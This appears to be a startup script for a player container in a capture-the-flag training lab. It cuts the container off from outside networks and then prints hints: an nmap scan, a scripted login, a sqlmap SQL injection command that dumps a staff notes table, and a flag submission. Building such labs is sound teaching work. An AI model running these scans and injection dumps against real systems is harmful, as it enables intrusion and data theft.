#!/bin/sh
# Box it in: drop the default route so this container cannot reach the host LAN
# or the internet. Same-network traffic to the town's containers still works, so
# you can still scan and attack the targets.
ip route del default 2>/dev/null && echo "[player] default route removed" \
  || echo "[player] no default route to remove"

cat <<'EOF'
[player] ready. Try:
  nmap -sV websites
  # get a shop session, then dump the flag:
  curl -s -c /tmp/j -d 'username=shopper&password=shopper' http://websites/ >/dev/null
  sqlmap -u "http://websites/search.php?q=x" --load-cookies=/tmp/j --batch \
         --dump -T staff_notes -D generalstore
  # submit it:
  curl -s -X POST http://scoring:8001/api/score/submit -H 'Content-Type: application/json' \
       -b <your session cookie> -d '{"flag":"PKTR{...}"}'
EOF

exec sleep infinity
